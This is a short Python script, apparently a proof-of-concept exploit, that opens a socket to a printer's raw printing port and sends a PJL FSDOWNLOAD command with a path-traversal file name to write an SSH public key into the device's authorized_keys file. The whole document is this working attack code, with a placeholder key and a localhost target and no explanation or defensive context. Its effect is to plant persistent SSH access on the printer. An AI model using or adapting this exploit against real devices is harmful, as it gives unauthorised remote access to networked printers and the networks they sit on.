import socket

sshKey = b"PUB SSH KEY"
job = b"@PJL FSDOWNLOAD NAME=\"0:/../.ssh/authorized_keys\" SIZE=%d\r\n" % len(sshKey) + sshKey

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9100))
s.send(b"\x1b%-12345X" + job + b"\x1b%-12345X\r\n")

try: s.recv(200)
except: pass
s.close()
